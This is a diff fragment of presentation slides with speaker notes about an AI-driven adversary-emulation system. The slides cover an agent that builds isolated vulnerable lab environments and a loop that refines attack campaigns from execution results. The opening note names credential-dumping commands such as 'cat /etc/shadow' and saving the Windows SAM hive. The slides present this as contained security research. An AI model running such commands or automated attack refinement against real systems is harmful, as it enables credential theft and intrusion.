+The right column makes the subtle point: a technique is not one command. Atomic Red Team ships multiple executors because the same behavior looks different per operating system. Credential dumping, T1003, is cat /etc/shadow on Linux, saving the SAM hive on Windows, reading ShadowHashData on macOS. Ingress tool transfer, T1105, is curl on Linux, Invoke-WebRequest on Windows, curl plus chmod on macOS. And the key consequence, in the bottom card: when the agent picks the Windows executor, it has implicitly decided the target must be a Windows host, so that choice propagates straight into stage five. The command and the environment are two sides of the same decision.
+-->
+
+---
+layout: default
+---
+
+# Environment agent (Stage 5)
+
+<div class="grad-rule"></div>
+
+<div class="two-col">
+<div class="tight">
+
+<div class="card edge-purple">
+<h3>Job</h3>
+<p>Turn the environment parameters into an <strong>actual isolated target environment</strong>, the hosts, services and vulnerabilities the campaign needs to land. This is the <strong>environment-emulation gap</strong>, automated.</p>
+</div>
+
+<div class="card edge-blue">
+<h3>How it works</h3>
+<ul>
+<li><strong>Input:</strong> the environment-parameter spec (from Stage 4).</li>
+<li><strong>Design:</strong> decide which hosts exist, what services they run, which vulnerabilities they expose.</li>
+<li><strong>Split build:</strong> choose what must be installed during the egress window vs. configured <strong>offline-isolated</strong>.</li>
+<li><strong>Provision:</strong> bring up the Docker/compose topology, verify health, then load the Abilities.</li>
+</ul>
+</div>
+
+</div>
+
+<div class="tight">
+<div class="card edge-red">
+<h3>Output</h3>
+<p>A ready, <strong>isolated</strong> environment tagged <code>origin = ai_generated</code>, verified against the internal subnets before anything can run against it.</p>
+</div>
+
+<div class="card flat edge-purple" style="padding:.6rem .8rem;"><p><strong>Safety is inherited, not re-invented:</strong> the read-only, fail-closed isolation check runs exactly as today. An environment the agent builds is held to the same bar as one a human built.</p></div>
+</div>
+
+</div>
+
+<!--
+Component four is the environment agent, stage five, which automates the second face of the gap, environment emulation.
+
+Its job, top-left: take the environment-parameter specification that the operationalization agent produced and turn it into an actual, isolated target environment, the battlefield, the hosts and services and vulnerabilities that the campaign's commands need in order to succeed.
+
+The how, on the left. The input is that environment-parameter spec from stage four. First it designs: it decides which target hosts have to exist, what services each must run, and which vulnerabilities each must expose so that the techniques can actually land, if a technique exploits a vulnerable web service, that service has to be there and has to be vulnerable in the right way. Then the split-build decision, which is specific to how we keep the lab contained: it chooses what must be installed during the brief controlled egress window, when the lab is allowed to reach out, versus what can be configured entirely offline once the lab is sealed. Then it provisions: it brings up the Docker and compose topology, verifies the containers are healthy, and loads the Abilities so they are ready to execute.
+
+The output, top-right, is a ready, isolated environment tagged origin AI-generated, and critically it is verified against the internal subnets before any attack can run against it.
+
+And the bottom card is the safety point for this component: the environment agent does not get to invent its own safety rules. The same read-only, fail-closed isolation check that guards a human-built environment runs here unchanged. An environment the agent constructs is held to exactly the same bar, if it is not provably isolated, nothing executes.
+-->
+
+---
+layout: default
+---
+
+# Measure loop agent (Stage 6)
+
+<div class="grad-rule"></div>
+
+<div class="two-col">
+<div class="tight">
+
+<div class="card edge-purple">
+<h3>Job</h3>
+<p>Close the loop. Read the <strong>execution verdict</strong> and diagnose <em>why</em> the curation fell short, then feed concrete fixes back upstream. This is what makes it an <strong>agent, not a one-shot generator</strong>.</p>
+</div>
+
+<div class="card edge-blue">
+<h3>How it works</h3>
+<ul>
+<li><strong>Input:</strong> the Stage 6 report, success rate, failed nodes, telemetry, verdict.</li>
+<li><strong>Diagnose:</strong> for each failed node, was it a bad/mis-parametrized <strong>command</strong> (St.4), a missing <strong>env</strong> service (St.5), or a wrong <strong>order</strong> (St.3)?</li>
+<li><strong>Attribute:</strong> route the fix to the responsible upstream agent.</li>
+<li><strong>Re-run &amp; remember:</strong> re-execute, and persist the lesson in long-term memory.</li>
+</ul>
+</div>
+
+</div>
+
+<div class="tight">
+<div class="card edge-red">
+<h3>Output</h3>
+<p>An <strong>improved curation</strong> each pass, iterating toward higher <strong>procedural sufficiency</strong>, using the measurable verdict as the reward signal.</p>
+</div>
+
+<div class="card flat edge-grad" style="padding:.6rem .8rem;"><p><strong>Stage 6 itself is unchanged.</strong> The agent does not rewrite execution or measurement, it <strong>consumes</strong> their output. The loop reads the same verdict a human researcher reads.</p></div>
+</div>
+
+</div>
+
+<!--
+Component five is the measurement-and-feedback loop, built on stage six, and this is the component that elevates the system from a generator into a genuine agent.
+
+Its job, top-left: close the loop. After a curation has actually executed, read the verdict, figure out why it fell short of full procedural sufficiency, and feed concrete corrections back upstream to the agents that can fix them. A one-shot generator produces a curation and stops; an agent runs it, sees how it did, and improves, that difference is this component.
+
+The how, on the left. The input is the stage-six report: the success rate, the list of failed nodes, the per-technique telemetry, and the overall verdict. Then the diagnostic reasoning, which is the heart of it: for each node that failed, which stage is actually to blame? Was it a wrong or mis-parametrized command, a stage-four problem? Was a required service missing from the environment, a stage-five problem? Or did the steps run in the wrong order, a stage-three problem? Then it attributes: it routes the specific fix to the responsible upstream agent, the DAG agent, the operationalization agent, or the environment agent. And then it re-runs and remembers: it re-executes the corrected curation, and it persists what it learned into long-term memory, so the lesson carries forward to the next campaign.
+
+The output, top-right, is an improved curation on each pass, iterating toward higher procedural sufficiency, and it is using the measurable verdict as its reward signal, which is what makes the improvement principled rather than guesswork.
+
+And the bottom card is an important clarification, it connects back to your earlier question about stage six: the agent does not change stage six at all. Execution and measurement stay exactly as they are. The loop simply consumes the very same verdict that a human researcher would read, and acts on it. Stage six is the signal; the loop is the response. With all five components laid out, let me close by showing what is already proven and where this goes next.
 -->
 
 ---
